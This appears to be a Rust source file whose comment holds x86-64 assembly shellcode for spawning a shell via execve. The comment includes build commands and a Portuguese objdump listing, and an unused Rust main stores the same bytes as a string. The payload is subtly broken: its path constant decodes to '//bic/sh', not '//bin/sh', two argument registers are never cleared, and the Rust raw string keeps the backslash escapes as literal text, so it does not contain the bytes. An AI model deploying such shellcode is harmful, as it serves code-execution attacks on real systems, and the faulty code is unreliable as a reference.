/*

===============
 ASSEMBLY CODE
===============

section .text
   global _start

_start:
   nop
   nop
   nop

   xor rdi, rdi
   push 0x0
   mov rdi, 0x68732f6369622f2f
   push rdi 
   mov rdi, rsp
   mov al, 59
   syscall

Compiling: nasm -f elf64 shellcode.asm
Linking: ld shellcode.o -o shellcode




===============
    OBJDUMP
===============

a: formato do arquivo elf64-x86-64


Desmontagem da seção .text:

0000000000401000 <_start>:
  401000:       90                      nop
  401001:       90                      nop
  401002:       90                      nop
  401003:       48 31 ff                xor    rdi,rdi
  401006:       6a 00                   push   0x0
  401008:       48 bf 2f 2f 62 69 63    movabs rdi,0x68732f6369622f2f
  40100f:       2f 73 68 
  401012:       57                      push   rdi
  401013:       48 89 e7                mov    rdi,rsp
  401016:       b0 3b                   mov    al,0x3b
  401018:       0f 05                   syscall


*/



fn main(){
  let shell: &str = r"\x90\x90\x90\x48\x31\xff\x6a\x00\x48\xbf\x2f\x2f\x62\x69\x63\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
 

}
